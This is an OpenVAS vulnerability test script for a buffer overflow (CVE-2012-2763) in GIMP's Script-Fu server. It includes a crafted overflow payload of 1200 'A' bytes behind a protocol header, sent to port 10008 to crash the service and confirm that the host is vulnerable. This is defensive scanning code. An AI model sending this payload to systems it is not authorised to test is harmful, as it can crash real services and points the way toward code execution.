###############################################################################
# OpenVAS Vulnerability Test
#
# GIMP Script-Fu Server Buffer Overflow Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802878");
  script_version("2019-05-20T11:12:48+0000");
  script_cve_id("CVE-2012-2763");
  script_bugtraq_id(53741);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2019-05-20 11:12:48 +0000 (Mon, 20 May 2019)");
  script_tag(name:"creation_date", value:"2012-06-27 13:12:09 +0530 (Wed, 27 Jun 2012)");
  script_name("GIMP Script-Fu Server Buffer Overflow Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_dependencies("find_service.nasl");
  script_require_ports(10008);

  script_xref(name:"URL", value:"http://secunia.com/advisories/49314");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18956");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18973");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/113201/GIMP-script-fu-Server-Buffer-Overflow.html");
  script_xref(name:"URL", value:"http://www.reactionpenetrationtesting.co.uk/advisories/scriptfu-buffer-overflow-GIMP-2.6.html");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to gain control of EIP and
  potentially execute arbitrary code.");

  script_tag(name:"affected", value:"GIMP version 2.6.12 and prior.");

  script_tag(name:"insight", value:"The script-fu server process in GIMP fails to handle a specially crafted
  command input sent to TCP port 10008, which could be exploited by remote attackers to cause a buffer overflow.");

  script_tag(name:"solution", value:"Upgrade to GIMP version 2.8.0 or later.");

  script_tag(name:"summary", value:"This host is running GIMP Script-Fu Server and is prone to buffer
  overflow vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

port = 10008;
if(!get_port_state(port)){
  exit(0);
}

soc = open_sock_tcp(port);
if(!soc){
  exit(0);
}

## Send a Test msg to check if server is responding
testmsg ='\x47\x00\x04\x74\x65\x73\x74';

send(socket:soc, data: testmsg);
res = recv_line(socket:soc, length:100);
res = hexstr(res);

# nb: first byte 0x47 (Magic byte 'G') and second byte 0x00 for error (0 on success, 1 on error)
if(!res || res !~ "^470100") {
  close(soc);
  exit(0);
}

exploit = crap(data:"A", length: 1200);
exploit = '\x47\x04\xB0' + exploit;

send(socket:soc, data: exploit);
sleep(5);

## Send Test msg again to confirm server is crashed
send(socket:soc, data: testmsg);
res = recv_line(socket:soc, length:100);
close(soc);

if(!res){
  security_message(port);
}
